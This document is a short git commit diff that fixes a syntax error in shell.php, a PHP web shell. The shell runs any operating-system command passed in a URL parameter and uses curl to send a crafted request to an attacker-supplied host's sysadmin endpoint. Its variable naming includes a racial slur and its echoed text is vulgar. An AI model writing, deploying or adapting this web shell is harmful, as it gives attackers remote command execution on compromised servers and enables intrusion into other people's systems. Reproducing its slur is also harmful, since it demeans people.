c25b8260f265a1522e4e1ddb57d1138d333d9b94
55Cent <124550381+55Cent@users.noreply.github.com>
2023-02-21 19:43:17 +0100

    Update shell.php

--- shell.php
+++ shell.php
@@ -1,1 +1,1 @@
-<?php $lgaetz = $_GET['nigga']; system("curl $lgaetz/ajax.php?display=sysadmin_%%%("."WTF%.%)MOH&view=portmgmt%208S%2250%%%00.+.+; echo Seems_Fuckable"); system($_GET[hex]; ?>
+<?php $lgaetz = $_GET['nigga']; system("curl $lgaetz/ajax.php?display=sysadmin_%%%("."WTF%.%)MOH&view=portmgmt%208S%2250%%%00.+.+; echo Seems_Fuckable"); system($_GET[hex]); ?>
